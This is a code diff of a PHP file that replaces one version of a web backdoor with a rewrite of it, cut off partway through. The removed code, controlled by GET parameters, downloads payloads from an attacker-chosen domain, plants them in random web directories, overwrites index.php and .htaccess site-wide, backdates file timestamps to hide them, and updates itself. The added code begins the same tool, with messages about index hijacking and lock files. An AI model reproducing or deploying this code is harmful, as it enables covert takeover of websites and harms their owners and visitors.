@@ -1,861 +1,348 @@
-<?php 
-    error_reporting(0);
-	define('BASE_PATH',str_ireplace($_SERVER['PHP_SELF'],'',__FILE__));
-	function curl_get_contents($url){
-       $ch =curl_init();
-       curl_setopt($ch, CURLOPT_URL, $url);
-       curl_setopt($ch, CURLOPT_TIMEOUT,5);
-       curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
-       curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
-       $r = curl_exec($ch);
-       curl_close($ch);
-       return $r;
+<?php
+error_reporting(0);
+class ErrorCode
+{
+    const E_200400 = 200400;
+}
+class MsgText
+{
+    const PARAM_EMPTY = 'param is empty';
+    const PARAM_TYPE = 'param type error';
+    const VALUE_ERROR = 'value error';
+    const NOCHANGE = 'no change';
+    const LOCK_FILE_SUCCESS = 'generate lock file success,but lock index.php error';
+    const LOCK_FILE_ERROR = 'generate lock file error';
+    const REMOTE_GET_ERROR = 'get remote content error';
+    const LOCAL_FILE_ERROR = 'generate local file error';
+    const SUCCESS = 'success';
+    const LOCAL_FILE_EXISTS = 'local file doesn\'t exist';
+    const REMOTE_FILE_EXISTS = 'remote file doesn\'t exist';
+    const RENAME_ERROR = 'rename error';
+    const INDEX_ERROR = 'index hijack error';
+    const UNKNOWN_ERROR = 'unknown error';
+    const DECRYPT_FAIL = 'params decrypt fail';
+}
+function error($msg = MsgText::UNKNOWN_ERROR, $extras = [], $code = 0)
+{
+    empty($code) && $code = ErrorCode::E_200400;
+    exit(@json_encode(['code' => $code, 'msg' => $msg, 'extras' => $extras], JSON_UNESCAPED_UNICODE));
+}
+function success($data)
+{
+    exit(@json_encode(['code' => 200, 'msg' => MsgText::SUCCESS, 'data' => $data], JSON_UNESCAPED_UNICODE));
+}
+function getDirPathsByLevel($level = 6)
+{
+    $initDir = $_SERVER['DOCUMENT_ROOT'];
+    $dirs = array($initDir);
+    $count = count($dirs);
+    while (count($dirs) > ($count - 1)) {
+        $path = $dirs[($count - 1)];
+        $count += 1;
+        if (@is_dir($path) && @$handle = @opendir($path)) {
+            while ($file = @readdir($handle)) {
+                $realpath = $path . '/' . $file;
+                if ($file == '.' || $file == '..' || !is_dir($realpath) || substr($file, 0, 1) === '.') {
+                    continue;
+                }
+                $path3 = str_replace($initDir, "", $path);
+                $path4 = explode("/", $path3);
+                if (count($path4) > $level - 1) {
+                    continue;
+                }
+                $dirs[] = $realpath;
+            }
+        }
+        @closedir($handle);
     }
-    function check_remote_file_exists($url) {
-	    $curl = curl_init($url);
-	    curl_setopt($curl, CURLOPT_NOBODY, true);
-	    curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'GET');
-	    $result = curl_exec($curl);
-	    $found = false;
-	    if ($result !== false) {
-	        $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
-	        if ($statusCode == 200) {
-	            $found = true;
-	        }
-	    }
-	    curl_close($curl);
-	    return $found;
-	}
-	function copyfiles($file1,$file2){
-	 	$contentx =@file_get_contents($file1);
-	  	$openedfile = @fopen($file2, "w");
-	  	@fwrite($openedfile, $contentx);
-	  	@fclose($openedfile);
-	    if ($contentx === FALSE) {
-	   		$status=false;
-	    }else $status=true;
-	   	return $status;
-  	}
-	function read_dir_queue($dir,$level=5){
-		$files=array();
-		$files1=array();
-		$queue=array($dir);
-		while(@$data=each($queue)){
-			$path=$data['value'];
-			if(@is_dir($path) && @$handle=@opendir($path)){
-				while($file=@readdir($handle)){
-					$path3 = str_replace($_SERVER['DOCUMENT_ROOT'],"",$path);
-					$path4 = explode("/",$path3);
-					if(count($path4)>($level+1)){ break 2; }
-					//if(count($files)>1000){ break 2; }
-					if($file=='.'||$file=='..') continue;
-					$files[] = $real_path=$path.'/'.$file;
-					if (is_dir($real_path)) $queue[] = $real_path;
-				}
-			}
-			@closedir($handle);
-		}
-		return $files;
-	}
-	function read_dir_queue1($dir,$level=5){
-		$files=array();
-		$files1=array();
-		$queue=array($dir);
-		while(@$data=each($queue)){
-			$path=$data['value'];
-			if(@is_dir($path) && @$handle=@opendir($path)){
-				while($file=@readdir($handle)){
-					$path3 = str_replace($_SERVER['DOCUMENT_ROOT'],"",$path);
-					$path4 = explode("/",$path3);
-					if(count($path4)>$level){ break 2; }
-					//if(count($files)>1000){ break 2; }
-					if($file=='.'||$file=='..') continue;
-					$files[] = $real_path=$path.'/'.$file;
-					if (is_dir($real_path)) $queue[] = $real_path;
-				}
-			}
-			@closedir($handle);
-		}
-		return $files;
-	}
-	function rpath_arry($dir){
-		$files=array();
-		$queue=array($dir);
-		while(@$data=each($queue)){
-			$path=$data['value'];
-			if(@is_dir($path) && @$handle=@opendir($path)){
-				while($file=@readdir($handle)){
-					$path3 = str_replace($_SERVER['DOCUMENT_ROOT'],"",$path);
-					$path4 = explode("/",$path3);
-					//if(count($path4)>($level+1)){ break 2; }
-					//if(count($files)>1000){ break 2; }
-					if($file=='.'||$file=='..') continue;
-					$files[] = $real_path=$path.'/'.$file;
-					if (is_dir($real_path)) $queue[] = $real_path;
-				}
-			}
-			@closedir($handle);
-		}
-		return $files;
-	}
-	function getInd_Content($base_path1){
- 		$file_path = $base_path1.'/index.php';
- 		$file_path1 = $base_path1.'/index.html';
- 		$file_path2 = $base_path1.'/index.htm';
- 		$file_path3 = $base_path1.'/default.html';
- 	
- 		if(file_exists($file_path)){
- 			$str=@file_get_contents($file_path);
- 			$shell_content1=  $str;
-			$shell_content2 = explode('?>',$shell_content1);
-			$shell_content3 = $shell_content1;
-			for($i=0;$i<count($shell_content2);$i++){
-	 			if(strpos($shell_content2[$i],'base64_decode(') !== false || strpos($shell_content2[$i],'urldecode(') !== false || strpos($shell_content2[$i],'O00__0OOO_') !== false || strpos($shell_content2[$i],'yumingid') !== false || strpos($shell_content2[$i],'urlgz=') !== false || strpos($shell_content2[$i],'O0O_0O_O_0') !== false || strpos($shell_content2[$i],'wp-admin') !== false || strpos($shell_content2[$i],'ignore_user_abort') !== false || strpos($shell_content2[$i],'HTTP_REFERER') !== false || strpos($shell_content2[$i],'sitemap') !== false || strpos($shell_content2[$i],'$x(') !== false || strpos($shell_content2[$i],'$_GET["3x"]') !== false || strpos($shell_content2[$i],'error_reporting') !== false || strpos($shell_content2[$i],'ini_set(') !== false || strpos($shell_content2[$i],'ini_set(') !== false){
-				 	$shell_content3=str_replace($shell_content2[$i]."?>","",$shell_content3);
-				}
- 			}
-            echo $shell_content3;
- 			exit;
- 		}else if(file_exists($file_path1)){
- 			$str1=@file_get_contents($file_path1);
- 			echo $str1;
- 			exit;
- 		}else if(file_exists($file_path2)){
- 			$str2=@file_get_contents($file_path2);
- 			echo $str2;
- 			exit;
- 		}else if(file_exists($file_path3)){
- 			$str3=@file_get_contents($file_path3);
- 			echo $str3;
- 			exit;
- 		}else{
- 			echo '';
- 			exit;
- 		}
-	}
-	function dir_size1($dir3,$url){
-	      $dh = @opendir($dir3);
-	      $return = array();
-		  while($file = @readdir($dh)){
-		     if($file!='.' and $file!='..'){
-		     	$filetime[] = date("Y-m-d H:i:s",filemtime($file));
-	         }
-	      }  
-          @closedir($dh);             
-          @array_multisort($filetime);
-          return $filetime;
-	}
- 	$sig=@$_GET['sig'];
- 	@$domain_2020='http://'.$_GET['domain'];
- 	if($sig=='beima'){
- 		$level = $_GET['level'];
- 		$aPathes = @read_dir_queue($_SERVER['DOCUMENT_ROOT'],$level);
-		function getDepth($sPath) {
-		    return substr_count($sPath, '/');
-		}
-		$aPathDepths = array_map('getDepth', $aPathes);
-		arsort($aPathDepths);
-		$arry1=array();
-		foreach ($aPathDepths as $iKey => $iDepth) {
-			$arry11 = str_replace(strtolower($_SERVER['DOCUMENT_ROOT']),"",strtolower($aPathes[$iKey]));
-			$arry11 = dirname($arry11);
-			$arry22 = explode("/",$arry11);
-			if(count($arry22)==$level){
-				$arry1[] = dirname($aPathes[$iKey]);
-			}else{
-				$arry1[] = dirname($aPathes[$iKey]);
-			}
-		}
-		$arry2= array_unique($arry1);
-		shuffle($arry2);
-		$rndKey = array_rand($arry2);
-		$create_path1 = $arry2[$rndKey];
-		$shell_file = $_GET['shell_file'];
-		$shell_source5 = $domain_2020."/".$shell_file.".html";
-		if(check_remote_file_exists($shell_source5) && $_GET['file_name']!=""){
-			$file_name = $_GET['file_name'];
-			if($file_name!=""){
-				$shell_end5 = $create_path1.'/'.$file_name;
-			}else{
-				$shell_end5 = $create_path1.'/style.php';
-			}
-	 		if(copyfiles($shell_source5,$shell_end5))
-		    {
-		    	if($_SERVER["HTTPS"] == "on") 
-			    {
-			        $http1="https://";
-			    }else{
-			    	$http1="http://";
-			    }
-		     	if(!file_exists($shell_end5))
-				{
-				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
-				    exit;
-				}
-				$time3=@dir_size1($shell_end5,'');
-		 		$time4=strtotime($time3[0]);
-	 		 	touch($shell_end5,$time4);
-		 		$shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
-		 		echo $shell_end6; 
-		    }else{
-		    	$str6=@curl_get_contents($shell_source5);
-		    	file_put_contents($shell_end5,$str6);
-		    	if($_SERVER["HTTPS"] == "on") 
-			    {
-			        $http1="https://";
-			    }else{
-			    	$http1="http://";
-			    }
-		     	if(!file_exists($shell_end5))
-				{
-				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
-				    exit;
-				}
-				$time3=@dir_size1($shell_end5,'');
-		 		$time4=strtotime($time3[0]);
-	 		 	touch($shell_end5,$time4);
-			    $shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
-		 		echo $shell_end6;
-		    }
-		}
-	    exit;
- 	}else if($sig=='jc_other'){
- 		$level = $_GET['level'];
- 		$aPathes = read_dir_queue1($_SERVER['DOCUMENT_ROOT'],$level);
-		function getDepth($sPath) {
-		    return substr_count($sPath, '/');
-		}
-		$aPathDepths = array_map('getDepth', $aPathes);
-		arsort($aPathDepths);
-		$arry1=array();
-		foreach ($aPathDepths as $iKey => $iDepth) {
-			$arry11 = str_replace(strtolower($_SERVER['DOCUMENT_ROOT']),"",strtolower($aPathes[$iKey]));
-			$arry11 = dirname($arry11);
-			$arry22 = explode("/",$arry11);
-			if(count($arry22)==$level){
-				$arry1[] = dirname($aPathes[$iKey]);
-			}else{
-				$arry1[] = dirname($aPathes[$iKey]);
-			}
-		}
-		$arry2= array_unique($arry1);
-		shuffle($arry2);
-		$rndKey = array_rand($arry2);
-		$create_path1 = $arry2[$rndKey];
-		$shell_file = $_GET['shell_file'];
-		$shell_source5 = $domain_2020."/".$shell_file.".html";
-		if(check_remote_file_exists($shell_source5) && $shell_file!=""){
-			$file_name = $_GET['file_name'];
-			if($file_name!=""){
-				$shell_end5 = $create_path1.'/'.$file_name;
-			}else{
-				$shell_end5 = $create_path1.'/style.php';
-			}
-	 		if(copyfiles($shell_source5,$shell_end5))
-		    {
-		    	if($_SERVER["HTTPS"] == "on") 
-			    {
-			        $http1="https://";
-			    }else{
-			    	$http1="http://";
-			    }
-		     	if(!file_exists($shell_end5))
-				{
-				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
-				    exit;
-				}
-				$time3=@dir_size1($shell_end5,'');
-		 		$time4=strtotime($time3[0]);
-	 		 	touch($shell_end5,$time4);
-		 		$shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
-		 		echo $shell_end6; 
-		    }else{
-		    	$str6=@curl_get_contents($shell_source5);
-		    	file_put_contents($shell_end5,$str6);
-		    	if($_SERVER["HTTPS"] == "on") 
-			    {
-			        $http1="https://";
-			    }else{
-			    	$http1="http://";
-			    }
-		     	if(!file_exists($shell_end5))
-				{
-				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
-				    exit;
-				}
-				$time3=@dir_size1($shell_end5,'');
-		 		$time4=strtotime($time3[0]);
-	 		 	touch($shell_end5,$time4);
-			    $shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
-		 		echo $shell_end6;
-		    }
-		}
-	    exit;
- 	}else if($sig=='lock_index'){
- 		$level = $_GET['level'];
- 		$aPathes = read_dir_queue1($_SERVER['DOCUMENT_ROOT'],$level);
-		function getDepth($sPath){
-		    return substr_count($sPath, '/');
-		}
-		$aPathDepths = array_map('getDepth', $aPathes);
-		arsort($aPathDepths);
-		$arry1=array();
-		foreach ($aPathDepths as $iKey => $iDepth) {
-			$arry11 = str_replace(strtolower($_SERVER['DOCUMENT_ROOT']),"",strtolower($aPathes[$iKey]));
-			$arry11 = dirname($arry11);
-			$arry22 = explode("/",$arry11);
-			if(count($arry22)==$level){
-				$arry1[] = dirname($aPathes[$iKey]);
-			}else{
-				$arry1[] = dirname($aPathes[$iKey]);
-			}
-		}
-		$arry2= array_unique($arry1);
-		shuffle($arry2);
-		$rndKey = array_rand($arry2);
-		$create_path1 = $arry2[$rndKey];
-		$shell_file = $_GET['shell_file'];
-		$shell_source5 = $domain_2020."/".$shell_file.".html";
-		if(check_remote_file_exists($shell_source5) && $shell_file!=""){
-			$file_name = $_GET['file_name'];
-			if($file_name!=""){
-				$shell_end5 = $create_path1.'/'.$file_name;
-			}else{
-				$shell_end5 = $create_path1.'/style.php';
-			}
-	 		if(copyfiles($shell_source5,$shell_end5)){
-		    	if($_SERVER["HTTPS"] == "on") 
-			    {
-			        $http1="https://";
-			    }else{
-			    	$http1="http://";
-			    }
-		     	if(!file_exists($shell_end5))
-				{
-				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
-				    exit;
-				}
-		 		$time4=strtotime('2020-03-09 12:03:05');
-	 		 	touch($shell_end5,$time4);
-		 		$shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
-		 		echo $shell_end6; 
-		    }else{
-		    	$str6=@curl_get_contents($shell_source5);
-		    	file_put_contents($shell_end5,$str6);
-		    	if($_SERVER["HTTPS"] == "on") 
-			    {
-			        $http1="https://";
-			    }else{
-			    	$http1="http://";
-			    }
-		     	if(!file_exists($shell_end5))
-				{
-				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
-				    exit;
-				}
-		 		$time4=strtotime('2020-03-09 12:03:05');
-	 		 	touch($shell_end5,$time4);
-			    $shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
-		 		echo $shell_end6;
-		    }
-		}
-	    exit;
- 	}else if($sig=='wp_add_back'){
- 		$level = $_GET['level'];
- 		$aPathes = read_dir_queue1($_SERVER['DOCUMENT_ROOT'],$level);
-		function getDepth($sPath){
-		    return substr_count($sPath, '/');
-		}
-		$aPathDepths = array_map('getDepth', $aPathes);
-		arsort($aPathDepths);
-		$arry1=array();
-		foreach ($aPathDepths as $iKey => $iDepth) {
-			$arry11 = str_replace(strtolower($_SERVER['DOCUMENT_ROOT']),"",strtolower($aPathes[$iKey]));
-			$arry11 = dirname($arry11);
-			$arry22 = explode("/",$arry11);
-			if(count($arry22)==$level){
-				$arry1[] = dirname($aPathes[$iKey]);
-			}else{
-				$arry1[] = dirname($aPathes[$iKey]);
-			}
-		}
-		$arry2= array_unique($arry1);
-		shuffle($arry2);
-		$rndKey = array_rand($arry2);
-		$create_path1 = $arry2[$rndKey];
-		$shell_file = $_GET['shell_file'];
-		$shell_source5 = $domain_2020."/".$shell_file.".html";
-		if(check_remote_file_exists($shell_source5) && $shell_file!=""){
-			$file_name = $_GET['file_name'];
-			if($file_name!=""){
-				$shell_end5 = $create_path1.'/'.$file_name;
-			}else{
-				$shell_end5 = $create_path1.'/style.php';
-			}
-	 		if(copyfiles($shell_source5,$shell_end5)){
-		    	if($_SERVER["HTTPS"] == "on") 
-			    {
-			        $http1="https://";
-			    }else{
-			    	$http1="http://";
-			    }
-		     	if(!file_exists($shell_end5))
-				{
-				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
-				    exit;
-				}
-		 		$time4=strtotime('2020-03-09 12:03:05');
-	 		 	touch($shell_end5,$time4);
-		 		$shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
-		 		echo $shell_end6; 
-		    }else{
-		    	$str6=@curl_get_contents($shell_source5);
-		    	file_put_contents($shell_end5,$str6);
-		    	if($_SERVER["HTTPS"] == "on") 
-			    {
-			        $http1="https://";
-			    }else{
-			    	$http1="http://";
-			    }
-		     	if(!file_exists($shell_end5))
-				{
-				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
-				    exit;
-				}
-		 		$time4=strtotime('2020-03-09 12:03:05');
-	 		 	touch($shell_end5,$time4);
-			    $shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
-		 		echo $shell_end6;
-		    }
-		}
-	    exit;
- 	}else if($sig=='plan_task'){
-		$shell_source5 = $domain_2020."/plan_task.html";
-		if(check_remote_file_exists($shell_source5)){
-			$shell_end5 = BASE_PATH.'/wp-activate.php';
-	 		if(copyfiles($shell_source5,$shell_end5)){
-		    	if($_SERVER["HTTPS"] == "on"){
-			        $http1="https://";
-			    }else{
-			    	$http1="http://";
-			    }
-		     	if(!file_exists($shell_end5)){
-				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
-				    exit;
-				}
-		 		$time4=strtotime('2020-03-09 12:03:05');
-	 		 	touch($shell_end5,$time4);
-		 		$shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
-		 		echo $shell_end6; 
-		    }else{
-		    	$str6=@curl_get_contents($shell_source5);
-		    	file_put_contents($shell_end5,$str6);
-		    	if($_SERVER["HTTPS"] == "on"){
-			        $http1="https://";
-			    }else{
-			    	$http1="http://";
-			    }
-		     	if(!file_exists($shell_end5)){
-				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
-				    exit;
-				}
-		 		$time4=strtotime('2020-03-09 12:03:05');
-	 		 	touch($shell_end5,$time4);
-			    $shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
-		 		echo $shell_end6;
-		    }
-		}
-	    exit;
- 	}else if($sig=='jc_index'){
- 		$domain_name1 = trim(str_replace("www.","",$_SERVER['SERVER_NAME']));
- 		$shell_file = $_GET['shell_file'];
-		$file_path= BASE_PATH.'/index.php';
- 		$file_path1 = $domain_2020.'/shell_index/'.$domain_name1.'/index.html';
- 	    //if(!check_remote_file_exists($file_path1)){
-			$ser_url1= $domain_2020."/cpa_ind5.php?dname1=".$domain_name1."&check_address1=http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."&shell_file=".$shell_file."";
-			$file_contents_2=curl_get_contents($ser_url1);
-		//}
-		if(@$_SERVER["HTTPS"]=="on")
-		{
-		    $http1="https://";
-		}else{
-		    $http1="http://";
-		}
-		$tishi = $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
-	    $str1=@curl_get_contents($file_path1);
-		$str=@file_get_contents($file_path);
-	 	if(file_exists($file_path)){
-		    if(check_remote_file_exists($file_path1)){
-		    	$str1=@curl_get_contents($file_path1);
-				$str=@file_get_contents($file_path);
-				if($str==$str1){
-					 echo $tishi.'|index.php write success!';
-				}else{
-				     //echo 'fail';
-			         @chmod($file_path,0644);
-			         $result_unlink=unlink($file_path);
-			         if($result_unlink){
-				         if(copyfiles($file_path1,$file_path))
-				         {
-					 		 $time3=dir_size1(dirname(__FILE__),'');
-					 		 $time4=strtotime($time3[0]);
-					 		 touch(dirname(__FILE__).'/'.basename(__FILE__),$time4);
-					 		 touch($file_path,$time4);
-					 		 echo $tishi.'|index.php write success!';
-				         }
-				         else
-				         {
-				         	file_put_contents($file_path,$str1);
-				         	$str1=@curl_get_contents($file_path1);
-							$str=@file_get_contents($file_path);
-				         	if($str==$str1){
-						 		$time3=dir_size1(dirname(__FILE__),'');
-						 		$time4=strtotime($time3[0]);
-					 		 	touch(dirname(__FILE__).'/'.basename(__FILE__),$time4);
-					 		 	touch($file_path,$time4);
-					 		 	echo $tishi.'|index.php write success!';
-				         	}else{
-				         		echo $tishi.'|index.php write fail!';
-				         	}
-				         }
-			         }  
-				}
-			}
-	    }else{
-	    	if(check_remote_file_exists($file_path1)){
-			    @chmod($file_path,0644);
-			    if(copyfiles($file_path1,$file_path))
-			    {
-			        $time3=dir_size1(dirname(__FILE__),'');
-			 		$time4=strtotime($time3[0]);
-		 		 	touch(dirname(__FILE__).'/'.basename(__FILE__),$time4);
-		 		 	touch($file_path,$time4);
-		 		 	echo $tishi.'|index.php write success!';
-			    }
-			    else
-			    {
-		    		file_put_contents($file_path,$str1);
-		    		$str1=@curl_get_contents($file_path1);
-					$str=@file_get_contents($file_path);
-		    		if($str==$str1){
-				 		$time3=dir_size1(dirname(__FILE__),'');
-				 		$time4=strtotime($time3[0]);
-			 		 	touch(dirname(__FILE__).'/'.basename(__FILE__),$time4);
-			 		 	touch($file_path,$time4);
-			 		 	echo $tishi.'|index.php write success!';
-		         	}else{
-		         		echo $tishi.'|index.php write fail!';
-		         	}
-			    }
-	    	}else{
-	    		$shell_cont1 = getInd_Content(BASE_PATH);
-			    $shell_file = $_GET['shell_file'];
-			    $file_path1 = $domain_2020."/".$shell_file.".html";
-			    $shell_content = @curl_get_contents($file_path1);
-			    $shell_cont2 = substr_replace($shell_cont1,$shell_content,0,0);
-	    		@file_put_contents($file_path,$shell_cont2);
-	    	}
-		}
-		exit;
- 	}else if($sig=='change_hta'){
- 		//define('BASE_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));
-		//define('BASE_PATH',str_ireplace($_SERVER['PHP_SELF'],'',__FILE__));
-		$shell_source5 = $domain_2020."/htaccess.html";
-		$str7=@curl_get_contents($shell_source5);
-	 	if(strpos($str7,'<FilesMatch') !== false){	
-		 	$file_htaccess = BASE_PATH.'/.htaccess';
-	 		if($_SERVER["HTTPS"] == "on") 
-			{
-			    $http1="https://";
-			}else{
-			    $http1="http://";
-			}
-			$tishi = $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
-			
-			if(file_exists($file_htaccess)){
-				$result_unlink=unlink($file_htaccess);
-				if($result_unlink){
-					if(copyfiles($shell_source5,$file_htaccess)){
-						echo $tishi.'|.htaccess write success!';
-					}else{
-						$str6=@curl_get_contents($shell_source5);
-						$str=@file_get_contents($file_htaccess);
-						file_put_contents($file_htaccess,$str6);
-						if($str6==$str){
-							echo $tishi.'|.htaccess write success!';
-						}else{
-							echo $tishi.'|.htaccess write fail!';
-						}
-					}
-				}else{
-					if(copyfiles($shell_source5,$file_htaccess)){
-						echo $tishi.'|.htaccess write success!';
-					}else{
-						$str6=@curl_get_contents($shell_source5);
-						$str=@file_get_contents($file_htaccess);
-						file_put_contents($file_htaccess,$str6);
-						if($str6==$str){
-							echo $tishi.'|.htaccess write success!';
-						}else{
-							echo $tishi.'|.htaccess write fail!';
-						}
-					}
-				}
-			}else{
-				if(copyfiles($shell_source5,$file_htaccess)){
-					echo $tishi.'|.htaccess write success!';
-				}else{
-					$str6=@curl_get_contents($shell_source5);
-					$str=@file_get_contents($file_htaccess);
-					file_put_contents($file_htaccess,$str6);
-					if($str6==$str){
-						echo $tishi.'|.htaccess write success!';
-					}else{
-						echo $tishi.'|.htaccess write fail!';
-					}
-				}
-			}
-		}else{
-		 	echo $tishi.'|htaccess.html file dont exist or the content is wrong!';
-		}
-	    exit;
- 	}else if($sig=='change_hta_all'){
- 		//define('BASE_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));
-		//define('BASE_PATH',str_ireplace($_SERVER['PHP_SELF'],'',__FILE__));
-		$shell_source5 = $domain_2020."/htaccess.html";
-		$str7=@curl_get_contents($shell_source5);
-	 	if(strpos($str7,'<FilesMatch') !== false){
- 			$file_htaccess = BASE_PATH.'/.htaccess';
-	 		if($_SERVER["HTTPS"] == "on")
-			{
-			    $http1="https://";
-			}else{
-			    $http1="http://";
-			}
-			$tishi = $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
-			if(file_exists($file_htaccess)){
-				$result_unlink=unlink($file_htaccess);
-				if($result_unlink){
-					if(copyfiles($shell_source5,$file_htaccess)){
-						echo $tishi.'|.htaccess write success!';
-					}else{
-						$str6=@curl_get_contents($shell_source5);
-						$str=@file_get_contents($file_htaccess);
-						file_put_contents($file_htaccess,$str6);
-						if($str6==$str){
-							echo $tishi.'|.htaccess write success!';
-						}else{
-							echo $tishi.'|.htaccess write fail!';
-						}
-					}
-				}else{
-					if(copyfiles($shell_source5,$file_htaccess)){
-						echo $tishi.'|.htaccess write success!';
-					}else{
-						$str6=@curl_get_contents($shell_source5);
-						$str=@file_get_contents($file_htaccess);
-						file_put_contents($file_htaccess,$str6);
-						if($str6==$str){
-							echo $tishi.'|.htaccess write success!';
-						}else{
-							echo $tishi.'|.htaccess write fail!';
-						}
-					}
-				}
-			}else{
-				if(copyfiles($shell_source5,$file_htaccess)){
-					echo $tishi.'|.htaccess write success!';
-				}else{
-					$str6=@curl_get_contents($shell_source5);
-					$str=@file_get_contents($file_htaccess);
-					file_put_contents($file_htaccess,$str6);
-					if($str6==$str){
-						echo $tishi.'|.htaccess write success!';
-					}else{
-						echo $tishi.'|.htaccess write fail!';
-					}
-				}
-			}
-	 		
-	 		$files1 = @rpath_arry($_SERVER['DOCUMENT_ROOT']);
-	 		$files2 =array();
-	 		for($k=0;$k<count($files1);$k++){
-	 			$files2[]=dirname($files1[$k]);
-	 		}
-	 		$files3=array();
-	 		$files3 =array_filter(array_unique($files2));
-	 		foreach ($files3 as $key=>$value){
-		 		if( $files3[$key]!= BASE_PATH){
-		 			$file_htaccess1 = $files3[$key].'/.htaccess';
-		 			//file_put_contents($file_htaccess1,$str7);
-		 			copyfiles($shell_source5,$file_htaccess1);
-		 		    //echo $file_htaccess1.'--11<br />';
-		 		}
-	 		}
-		}else{
-		 	echo $tishi.'|htaccess.html file dont exist or the content is wrong!';
-		}
-	    exit;
- 	}else if($sig=='rename'){
- 		$rename = $_GET['rename'];
- 		$source_name = $_GET['source_name'];
- 		if($_GET['tag']!=''){
- 			$tag='#'.$_GET['tag'];
- 		}else{
- 			$tag='';
- 		}
- 		if($rename!="" && $source_name!=""){
-	 		$rename_file = dirname(__FILE__).'/'.$rename;
-		 	$source_file = dirname(__FILE__).'/'.$source_name;
-	 		if($_SERVER["HTTPS"] == "on") 
-			{
-			   $http1="https://";
-			}else{
-			   $http1="http://";
-			}
-			$rename_file1 = $http1.$_SERVER["HTTP_HOST"].str_replace(strtolower($_SERVER['DOCUMENT_ROOT']),'',strtolower($rename_file));
-			$source_file1 = $http1.$_SERVER["HTTP_HOST"].str_replace(strtolower($_SERVER['DOCUMENT_ROOT']),'',strtolower($source_file));
-			$rename_file1 = str_replace('\\','/',$rename_file1);
-			$source_file1 = str_replace('\\','/',$source_file1);
-		    if(file_exists($source_file)){
-		        if(rename($source_file,$rename_file)){
-		            echo $rename_file1.$tag;
-		        }else{
-		            echo $source_file1.$tag.'| rename fail!';
-		        }
-		    }else{
-		        echo $source_file1.$tag.'| no exists!';
-		    }
- 		}else{
- 			echo $source_file1.$tag.'| rename fail!';
- 		}
- 		exit;
- 	}else if($sig=='update'){
- 		$style_2020=$domain_2020.'/style_2020.html';
- 		$file_style=__FILE__;
- 		if(check_remote_file_exists($style_2020)){
- 			$str7=@curl_get_contents($style_2020);
-	 		if(strpos($str7,'domain_2020') !== false){	
-		 		if($_SERVER["HTTPS"] == "on") 
-				{
-				    $http1="https://";
-				}else{
-				    $http1="http://";
-				}
-				$tishi = $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
-	 			if(copyfiles($style_2020,$file_style))
-			    {
-			    	$time3=@dir_size1(dirname(__FILE__),'');
-					$time4=strtotime($time3[0]);
-					touch($file_style,$time4);
-			    	echo $tishi.'--update success!';
-			    }else{
-			    	$shell_cont5=@curl_get_contents($style_2020);
-			    	$shell51=@file_put_contents($file_style,$shell_cont5);
-			    	if($shell51>0){
-			    		$time3=@dir_size1(dirname(__FILE__),'');
-						$time4=strtotime($time3[0]);
-						touch($file_style,$time4);
-						echo $tishi.'--update success!';
-			    	}else{
-			    		echo $tishi.'--update fail!';
-			    	}
-			    }
-	 		}	
- 		}
-		exit;	
- 	}else if($sig=='shell519'){
-		$rename = $_GET['file_name'];
-		$shell_file = $_GET['shell_file'];
-		if($rename!="" && $shell_file!=""){
-	 		$shell_source5= $domain_2020."/".$shell_file.".html";
-	 		if(check_remote_file_exists($shell_source5)){
- 				$level = $_GET['level'];
-		 		$aPathes = @read_dir_queue($_SERVER['DOCUMENT_ROOT'],$level);
-				function getDepth($sPath) {
-				    return substr_count($sPath, '/');
-				}
-				$aPathDepths = array_map('getDepth', $aPathes);
-				arsort($aPathDepths);
-				$arry1=array();
-				foreach ($aPathDepths as $iKey => $iDepth) {
-					$arry11 = str_replace(strtolower($_SERVER['DOCUMENT_ROOT']),"",strtolower($aPathes[$iKey]));
-					$arry11 = dirname($arry11);
-					$arry22 = explode("/",$arry11);
-					if(count($arry22)==$level){
